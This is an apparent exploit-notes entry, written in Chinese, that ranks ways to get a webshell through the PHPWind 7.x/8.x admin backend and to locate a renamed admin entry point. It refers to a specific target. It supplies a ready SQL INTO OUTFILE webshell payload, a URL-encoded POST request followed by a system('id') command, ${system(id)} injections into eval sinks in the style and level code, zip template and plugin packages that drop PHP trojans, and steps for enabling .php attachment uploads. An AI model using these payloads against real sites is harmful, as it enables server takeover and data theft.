# PHPWind 7.x/8.x 后台 getshell 手法全谱（SQL INTO OUTFILE / 模板包导入 / 备份恢复 / cache.php+level.php eval 点 / 附件扩展名）+ 后台入口定位

- **code**: phpwind-7.x-8.x-后台-getshell-手法全谱-sql-into-outfile-模板包导入-备份恢复-cache.php-level.php
- **kind**: template
- **category**: rce
- **component**: PHPWind
- **versions**: PHPWind 7.x / 8.x（admin 模块同源）；SQL INTO OUTFILE 与模板包导入为跨版本通用
- **severity**: high
- **language**: php
- **source**: web
- **source_url**: https://target187.example.com/developer/article/1471580
- **verified_note**: 未在目标实测（情报角色零请求；且后台入口本身未定位，无法实测）。A1/A2 两个 eval 点的**存在性为源码级确证**（PHPWind 8.7 同源源码 admin/target117.example.com:684/706、admin/target120.example.com:596）；B/C/D/E 为通用手法汇聚，具体后台表单字段名需在实际版本上确认。A3（mawhole.php）为源码级**证否**。
- **path**: pocs/colour-判死与-7.5-等价字段-titlefont-证据链-eis-注入必须的-与-都被前台清洗吃掉/poc.php
- **created_at**: 2026-10-06T11:26:34.025Z
- **found_by**: exploit

## 描述

汇总 PHPWind 7.x/8.x 后台 getshell 的全部可用手法，按「一步到位程度」排序：B 数据库 SQL INTO OUTFILE 写马（1 个请求，最强）> D 模板/风格/插件包 zip 导入解压落马 > C 数据库备份/恢复 > A1/A2 后台 eval 点（cache.php 风格 CSS eval、level.php HTML eval，源码级确证存在，但 setstyles 写入侧有 $→\$ 转义需绕）> E 后台放开附件扩展名再前台传马。另附后台入口定位方法，纠正「admin/ 返回 9 字节 Forbidden = 后台被关」的误判。

## 用法

```
【推荐顺序】
1. 先定位后台入口（见 F 节）。目标 example.com 已改名，但 admin 目录下的 PHP 仍在真实执行，后台路线不该放弃。
2. 进后台后**优先 SQL INTO OUTFILE 一步写马**（B 节），这是唯一确定性一步到位的手法：
   SELECT '<?php @eval($_POST[1]);?>' INTO OUTFILE '/www/wwwroot/<站点>/bbs/x.php';
   回显报错信息本身会泄露路径（secure_file_priv / 权限问题都有明确报错），可用于二次修正。
3. SQL 不通就用「模板/风格/插件包导入」放 zip 马（D 节），构造含合法清单 + a.php 的 zip 上传导入，访问解压目录。
4. 再不行试 A1/A2 两个 eval 点；A1 需先解决 _css.htm 的写入侧 `$`→`\$` 转义。
5. 目标 disable_functions 空 + open_basedir 空 → 拿到任意写文件即等价 RCE，不必纠结禁用函数绕过。

【请求示例（SQL 写马，进后台后执行）】
POST /<后台入口>?adminjob=table HTTP/1.1
Content-Type: application/x-www-form-urlencoded

sql=SELECT+%27%3C%3Fphp+%40eval%28%24_POST%5B1%5D%29%3B%3F%3E%27+INTO+OUTFILE+%27%2Fwww%2Fwwwroot%2Fsite%2Fbbs%2Fx.php%27
# 然后 POST /bbs/x.php  1=system('id');

【EXP 落盘】runs/pw-exp/01-phpwind73x-vuln-list.md 第 4 节
```

## 正文

```
# PHPWind 后台 getshell 手法全谱（7.x/8.x 同源 admin 模块，逐条附源码位置与请求）

## A. 已验证存在的 eval sink（源码级确证，PHPWind 8.7 同源源码）

### A1. admin/target117.example.com:682-686 / 704-708 —— 风格 CSS 进 eval 双引号字符串
```php
$style_css = explode('<!--css-->',readover(D_P."data/style/{$tplpath}_css.htm"));
$style_css = addslashes(str_replace(array('<style type="text/css">','</style>'),'',$style_css[1]));
eval("\$style_css = \"$style_css\";");                                    // <== eval
pwCache::writeover(S::escapePath(D_P."data/bbscache/".$tplpath."_".$stylepath.".css"),$style_css);
```
· 字符串内 `${...}` 会被求值 → `${system(id)}` / `${@eval($_POST[1])}` 可用（addslashes 只逃生 `"' \ NUL`，`$ { }` 全放行）。
· **但写入侧被防守**：admin/target188.example.com:154 `$style_css = str_replace("$","\$",$cssadd[0].'<!--css-->'.$style_css.'<!--css-->'.$cssadd[2]);`
  → 后台正常写入路径会把 `$` 变成 `\$`，双引号内变成字面 `$`，插值失效。
  ⇒ 要打这条，必须找到**其它能把 `${...}` 原样写进 data/style/{tplpath}_css.htm 的写入点**（风格包导入/解压、任意文件写、SQL OUTFILE）。
· 触发：后台「更新缓存」（example.com?adminjob=cache 或后台首页的缓存更新按钮）。

### A2. admin/target120.example.com:596 —— 等级/用户组 HTML 进 eval
```php
eval("\$html = \"" . addcslashes($html, '"') . "\";");
```
· 只转义 `"`，`$` 与 `{}` 全放行 → `${system(id)}` 可用。
· 需定位 `$html` 的后台输入表单字段（用户组/等级的自定义 HTML 或权限描述）。

### A3. 前台 target108.example.com:992 —— 【死路，已判否】
```php
if ($topped > 0){ eval("\$specialSort = PW_THREADSPECIALSORT_TOP$topped;"); }
```
· 但第 921 行 `$topped = intval($topped);` → 不可控，且第 65 行 `$admincheck = pwRights($isBM,'topped')` 需版主权限。**别再试。**

## B. 数据库 SQL 执行 → 直接写 webshell（最强的后台 getshell）
· 后台「数据表管理 / 数据库管理」里通常有直接执行 SQL 的入口（admin/table.php、admin/optimize.php 一带）。
· 前提：MySQL 侧 `secure_file_priv = ''`（宝塔默认常为空）、已知 web 根绝对路径、MySQL 账号有 FILE 权限。
· payload：
```sql
SELECT '<?php @eval($_POST[1]);?>' INTO OUTFILE '/www/wwwroot/<站点目录>/bbs/x.php';
```
· 若站点用宝塔，web 根可从 `/www/wwwroot/` 下按域名目录名猜；也可先 `SELECT @@datadir` / 读 `data/sql_config.php` 拿配置反推路径。
· 一次请求拿 shell，是最优后台路径。

## C. 数据库备份/恢复（PHPWind 经典组合拳）
· 后台「数据备份」把表结构与数据导出成文件；配合「恢复」时对**表名/文件名**处理不严时，可把可控内容写进可访问目录。
· 变体：把备份文件路径/文件名指到 web 目录、或把备份内容里注入 PHP 代码后再恢复。
· 需先确认 7.3.2 的 admin/bakup.php 与对应模板的实际字段名（本角色未逐行读该文件，属**待确认**）。

## D. 模板 / 风格包 / 插件包导入解压
· 后台「模板管理」「风格管理」「插件管理」支持上传 zip 导入并解压到 web 可访问目录 → zip 内直接放 .php 即可。
· 同源证据：phpwind 9.0.2 的 `applications/appcenter/admin/AppController.php` uploadAction→doinstallAction→extractPackage，只校验 manifest.xml 的 alias 不重名即解压安装，木马落在 `src/extensions/<alias>/a.php`，直接访问 getshell。
  （来源：https://target187.example.com/developer/article/1471580 ）
· 7.x 的等价入口是后台的 hack 插件/风格/模板导入模块，思路完全一致：**打包合法清单文件 + 附带 php 马 → 导入解压 → 访问**。

## E. 附件上传扩展名（后台开了才有戏）
· 前台附件上传走黑名单校验，靠大小写/双写/php3-7 变形**打不动**（知识库 id=76 已由源码逐行审计确证）。
· 正确路径：后台「上传类型设置」的 `$db_uploadfiletype` 里加入 php → 再回前台用附件上传传马。
· 本目标还有一个更省事的放大器：`disable_functions` 空 + `open_basedir` 空 → 一旦拿到任意写文件即可直接 RCE，无需绕过任何禁用函数。

## F. 后台入口定位（目标 example.com 已物理改名）
· PHPWind 7.x 真正的后台入口是**根目录 example.com**（它 require common.php 后再 include admin/example.com）。
· 直接访问 `/bbs/admin/example.com`、`/bbs/admin/example.com` 返回 9 字节 Forbidden 是**文件级守卫** `!function_exists('readover') && exit('Forbidden');`，不是 nginx deny，也与登录态无关 —— 别据此判断后台已关闭。
· 改名后的入口名存储于数据库配置；可尝试的历史默认名/常见名：example.com、example.com、manage.php、target189.example.com、<域名前缀>example.com、target190.example.com、houtai.php、guanli.php、admin_<随机>.php。
· 也可以直接从目标 MySQL 里读（若通过其它途径拿到数据库）或从备份文件中找。

```
